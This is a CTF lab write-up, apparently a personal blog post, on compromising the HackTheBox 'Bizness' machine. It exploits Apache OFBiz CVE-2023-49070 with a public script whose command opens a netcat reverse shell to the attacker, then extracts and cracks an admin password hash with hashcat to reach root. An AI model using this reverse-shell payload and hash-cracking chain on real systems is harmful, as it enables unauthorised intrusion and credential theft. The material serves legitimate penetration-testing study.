---
layout: post
title: HackTheBox Bizness
date: 2024-01-06
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Bizness is an easy Linux machine showcasing an Apache OFBiz pre-authentication, remote code execution (RCE) foothold, classified as `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. The exploit is leveraged to obtain a shell on the box, where enumeration of the OFBiz configuration reveals a hashed password in the service&#039;s Derby database. Through research and little code review, the hash is transformed into a more common format that can be cracked by industry-standard tools. The obtained password is used to log into the box as the root user. ([Source](https://app.hackthebox.com/machines/Bizness/information))

# Enumeration

```bash
$ nmap -sV -sC 10.10.11.252
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.252
Host is up (0.0044s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here is the website.

![webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bizness/webpage.png?raw=true)

Performed directory enumeration using `ffuf` and found that there was a `/control` endpoint.

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u https://bizness.htb/FUZZ -ac
...
control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 217ms]
```

![webpage_control](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bizness/webpage_control?raw=true)

Performed further directory enumeration on this endpoint and found some other interesting endpoints.

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u https://bizness.htb/control/FUZZ -ac
...
help                    [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 512ms]
logout                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 570ms]
login                   [Status: 200, Size: 11060, Words: 1236, Lines: 186, Duration: 989ms]
view                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 512ms]
main                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 378ms]
views                   [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 173ms]
```

![webpage_control_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bizness/webpage_control_login?raw=true)

Browsing the `/login` endpoint resulted in an interesting information in the webpage footer. 

>   In the footer of the webpage: `Powered by Apache OFBiz. Release 18.12`

```
# To use images
![image](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/NAMEOFMACHINE/image.png?raw=true)
```

# Exploitation

This Apache OFBiz version is vulnerable to `CVE-2023-51467` and `CVE-2023-49070`.

Searching for `Apache OFBiz 18.12 exploit` resulted in this [Github repository](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass).

```bash
$ python3 exploit.py --url "https://bizness.htb/" --cmd "nc 10.10.14.11 9001 -e /bin/bash"
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.252] 50664
whoami
ofbiz
/usr/bin/script -qc /bin/bash /dev/null
ofbiz@bizness:/opt/ofbiz$ 
```

# Privilege Escalation

Analyzed the `Dockerfile` and noticed that there is a `docker-entrypoint.sh` file.

```bash
ofbiz@bizness:/opt/ofbiz$ cat Dockerfile
...
RUN ["useradd", "ofbiz"]
...
RUN ["/usr/bin/chown", "-R", "ofbiz:ofbiz", "/docker-entrypoint-hooks" ]

USER ofbiz
WORKDIR /ofbiz

...

# Leave executable scripts owned by root and non-writable, addressing sonarcloud rule,
# https://sonarcloud.io/organizations/apache/rules?open=docker%3AS6504&rule_key=docker%3AS6504
COPY --chmod=555 docker/docker-entrypoint.sh docker/send_ofbiz_stop_signal.sh .

COPY --chmod=444 docker/disable-component.xslt .
COPY --chmod=444 docker/templates templates

EXPOSE 8443
EXPOSE 8009
EXPOSE 5005

ENTRYPOINT ["/ofbiz/docker-entrypoint.sh"]
CMD ["bin/ofbiz"]
...
```

Browse to the `docker-entrypoint.sh` file and observed that there is a code function which loads a salted SHA-1 hash of the admin username and password and overwrites the value in  `framework/resources/templates/AdminUserLoginData.xml`.

```bash
ofbiz@bizness:/opt/ofbiz/docker$ cat docker-entrypoint.sh
#!/usr/bin/env bash
...

###############################################################################
# Create and load the password hash for the admin user.
load_admin_user() {
  if [ ! -f "$CONTAINER_ADMIN_LOADED" ]; then
    TMPFILE=$(mktemp)

    # Concatenate a random salt and the admin password.
    SALT=$(tr --delete --complement A-Za-z0-9 </dev/urandom | head --bytes=16)
    SALT_AND_PASSWORD="${SALT}${OFBIZ_ADMIN_PASSWORD}"

    # Take a SHA-1 hash of the combined salt and password and strip off any additional output form the sha1sum utility.
    SHA1SUM_ASCII_HEX=$(printf "$SALT_AND_PASSWORD" | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000')

    # Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running
    # through the printf command. Encode the result as URL base 64 and remove padding.
    SHA1SUM_ESCAPED_STRING=$(printf "$SHA1SUM_ASCII_HEX" | sed -e 's/\(..\)\.\?/\\x\1/g')
    SHA1SUM_BASE64=$(printf "$SHA1SUM_ESCAPED_STRING" | basenc --base64url --wrap=0 | tr --delete '=')

    # Concatenate the hash type, salt and hash as the encoded password value.
    ENCODED_PASSWORD_HASH="\$SHA\$${SALT}\$${SHA1SUM_BASE64}"

    # Populate the login data template
    sed "s/@userLoginId@/$OFBIZ_ADMIN_USER/g; s/currentPassword=\".*\"/currentPassword=\"$ENCODED_PASSWORD_HASH\"/g;" framework/resources/templates/AdminUserLoginData.xml >"$TMPFILE"

    # Load data from the populated template.
    /ofbiz/bin/ofbiz --load-data "file=$TMPFILE"

    rm "$TMPFILE"

    touch "$CONTAINER_ADMIN_LOADED"
  fi
}
...
```

Browse to the xml file and found the default value of the admin password that will be overwritten.

```bash
ofbiz@bizness:/opt/ofbiz$ cat framework/resources/templates/AdminUserLoginData.xml
...
<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
</entity-engine-xml>
```

Run a command which grep all instance of `currentPassword=` and then filter away any instance of the value `47ca69ebb4bdc9ae0adec130880165d2cc05db1a`.

```bash
ofbiz@bizness:/opt/ofbiz$ grep -arl 'currentPassword=' . | xargs grep -lav '47ca69ebb4bdc9ae0adec130880165d2cc05db1a'
./applications/datamodel/data/demo/WorkEffortDemoData.xml
./applications/datamodel/data/demo/HumanresDemoData.xml
./applications/datamodel/data/demo/MarketingDemoData.xml
./applications/datamodel/data/demo/PartyDemoData.xml
./applications/datamodel/data/demo/ProductDemoData.xml
./applications/datamodel/data/demo/OrderDemoData.xml
./applications/datamodel/data/demo/ContentDemoData.xml
./applications/datamodel/data/demo/AccountingDemoData.xml
./runtime/data/derby/ofbiz/seg0/c54d0.dat
./framework/resources/templates/AdminUserLoginData.xml
./framework/security/data/PasswordSecurityDemoData.xml
./build/distributions/ofbiz.tar
./docker/docker-entrypoint.sh
./plugins/example/testdef/assertdata/TestUserLoginData.xml
./plugins/ebaystore/data/DemoEbayStoreData.xml
./plugins/ecommerce/data/DemoPurchasing.xml
./plugins/webpos/data/DemoRetail.xml
./plugins/scrum/data/scrumDemoData.xml
./plugins/myportal/data/MyPortalDemoData.xml
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml
```

>   The command searches recursively through the current directory and its subdirectories for files containing the string `'currentPassword='`.
>
>   It then lists the filenames that contain `'currentPassword='` and **do not** contain `'47ca69ebb4bdc9ae0adec130880165d2cc05db1a'`.

There seems to be an interesting file named `c54d0.dat` and there is a salted hash in this file.

```bash
ofbiz@bizness:/opt/ofbiz$ grep -ia 'currentPassword=' ./runtime/data/derby/ofbiz/seg0/c54d0.dat
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
```

Recall that the salted hash is in the format `$SHA${SALT}${SHA1SUM_BASE64}`.

Decoded the `SHA1SUM_BASE64` to hash `b8fd3f41a541a435857a8f3e751cc3a91c174362` using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ&oeol=CR). 

To use `hashcat -m 120`, the `${SALT} d` needs to be indicated at the end of the hash.

```bash
cat hash
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
❯ hashcat -a 0 -m 120 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
...
```

Login as root with the cracked password.

```bash
ofbiz@bizness:/opt/ofbiz$ su root
Password: monkeybizness
root@bizness:/opt/ofbiz# 
```

